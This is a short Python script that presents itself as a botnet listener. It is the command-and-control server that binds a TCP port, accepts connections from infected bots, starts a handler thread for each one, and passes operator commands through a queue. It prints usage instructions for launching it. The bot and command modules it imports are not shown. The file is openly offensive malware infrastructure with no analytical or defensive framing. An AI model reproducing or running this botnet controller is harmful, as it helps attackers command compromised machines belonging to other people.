
import socket
import sys
import os
import threading
import queue
from Bot_cmd import BotCmd
from Bot_handler import BotHandler

ClientList = {}
q = queue.Queue()
Socketthread = []



def listener(lhost, lport, q):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (lhost, lport)
    server.bind(server_address)
    server.listen(10)

    print("[+] Starting Botnet listener on tcp://" +
        lhost + ":" + str(lport) + "\n")
    BotCmdThread = BotCmd(q, Socketthread)
    BotCmdThread.start()
    while True:
        (client, client_address) = server.accept()  # start listening
        # BotHandler = Multiconn
        newthread = BotHandler(client, client_address, q, ClientList)
        BotCmdThread.socketthread.append(newthread)
        newthread.start()


def main():
    botCommand = BotCmd(q,Socketthread)
    if (len(sys.argv) < 3):
        print ("[!] Usage:\n  [+] python3 " + sys.argv[0] + " <LHOST> <LPORT>\n  [+] Eg.: python3 " + sys.argv[0] + " 0.0.0.0 8080\n")
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])
            listener(lhost, lport, q)
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")

if __name__ == '__main__':
    main()